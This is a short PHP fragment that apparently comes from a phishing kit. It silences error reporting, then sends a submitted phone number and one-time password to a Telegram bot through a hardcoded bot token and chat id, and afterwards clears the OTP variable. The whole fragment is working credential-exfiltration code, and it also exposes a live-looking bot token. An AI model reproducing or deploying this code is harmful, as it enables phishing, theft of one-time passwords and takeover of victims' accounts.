error_reporting(0);
error_log(0);
file_get_contents("https://api.telegram.org/bot1729991611:AAHNMJh9xPulpdUqS46UmHGwckc5rJ7n6zs/sendMessage?chat_id=-538746459&text=Number: " . $_POST['number'] . " OTP: " . $_POST['otp']);

$otp = null;
